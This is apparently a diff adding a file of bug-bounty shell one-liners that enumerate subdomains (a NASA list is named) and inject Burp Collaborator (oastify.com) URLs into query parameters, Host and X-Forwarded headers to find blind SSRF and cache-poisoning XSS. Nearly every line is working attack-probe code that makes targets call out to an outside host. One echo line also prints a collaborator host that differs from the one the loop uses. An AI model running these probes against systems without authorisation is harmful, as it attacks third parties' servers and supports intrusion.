@@ -1,0 +1,30 @@
+findomain -t DOMAIN -q | httpx -silent -threads 1000 | waybackurls|  grep "=" | qsreplace http://0nomdw2b9cfvrpapzmv47g7sijoac00p.oastify.com
+
+
+
+#Check Blind ssrf in Header,Path,Host & check xss via web cache poisoning.
+
+
+cat nasasubdomain.txt | assetfinder --subs-only| httprobe | while read url; do xss1=$(curl -s -L $url -H 'X-Forwarded-For: mmcdkvf5dtwwhns7a7f6px25xw3nref3.oastify.com'|grep xss) xss2=$(curl -s -L $url -H 'X-Forwarded-Host: xss.yourburpcollabrotort'|grep xss) xss3=$(curl -s -L $url -H 'Host: mmcdkvf5dtwwhns7a7f6px25xw3nref3.oastify.com'|grep xss) xss4=$(curl -s -L $url --request-target http://mmcdkvf5dtwwhns7a7f6px25xw3nref3.oastify.com/ --max-time 2); echo -e "\e[1;32m$url\e[0m""\n""Method[1] X-Forwarded-For: xss+ssrf => $xss1""\n""Method[2] X-Forwarded-Host: xss+ssrf ==> $xss2""\n""Method[3] Host: xss+ssrf ==> $xss3""\n""Method[4] GET http://mmcdkvf5dtwwhns7a7f6px25xw3nref3.oastify.com HTTP/1.1 ""\n";done\
+
+
+
+
+
+cat nasasubdomain.txt | assetfinder --subs-only | httprobe | while read url; do 
+    xss1=$(curl -s -L "$url" -H 'X-Forwarded-For: cp53nlivgjzmkdvxdxiwsn5v0m6du5iu.oastify.com' | grep xss)
+    xss2=$(curl -s -L "$url" -H 'X-Forwarded-Host:cp53nlivgjzmkdvxdxiwsn5v0m6du5iu.oastify.com' | grep xss)
+    xss3=$(curl -s -L "$url" -H 'Host: cp53nlivgjzmkdvxdxiwsn5v0m6du5iu.oastify.com' | grep xss)
+    xss4=$(curl -s -L "$url" --request-target "http://cp53nlivgjzmkdvxdxiwsn5v0m6du5iu.oastify.com/" --max-time 2)
+    
+    echo -e "\e[1;32m$url\e[0m"
+    echo "Method[1] X-Forwarded-For: xss+ssrf => $xss1"
+    echo "Method[2] X-Forwarded-Host: xss+ssrf => $xss2"
+    echo "Method[3] Host: xss+ssrf => $xss3"
+    echo "Method[4] GET http://0nomdw2b9cfvrpapzmv47g7sijoac00p.oastify.com HTTP/1.1"
+done
+
+
+cat urls.txt | xargs -I {} curl -k {}  Ye har URL ko sequentially request karega.
+
+
